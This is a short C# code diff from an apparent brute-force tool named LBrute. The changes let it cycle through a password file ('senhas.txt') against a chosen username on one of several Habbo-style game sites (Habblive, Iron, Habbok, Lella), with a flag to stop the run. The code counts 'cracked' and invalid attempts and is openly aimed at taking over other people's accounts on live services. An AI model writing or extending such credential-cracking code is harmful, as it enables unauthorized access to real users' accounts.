@@ -13,7 +13,7 @@ namespace LBrute
     {
         public static int crackeadas, invalidas;
         public static string hotel = "?";
-
+        public static bool executando;
         public static string LoginUrl, MeUrl;
         public static Dictionary<string, string> form = new();
 
@@ -97,11 +97,17 @@ namespace LBrute
             Checker(username, password, formulario);
         }
 
-
         private static void InitBrute(string username){
+            hotel = hotel.ToLower();
+
             foreach (var password in File.ReadAllLines("senhas.txt")) {
 
-                Habblive(username, password);
+                if (!executando) return;
+
+                if (hotel == "habblive") Habblive(username, password);
+                else if (hotel == "iron") Iron(username, password);
+                else if (hotel == "habbok") Habbok(username, password);
+                else if (hotel == "lella") Lella(username, password);
 
             }
         }
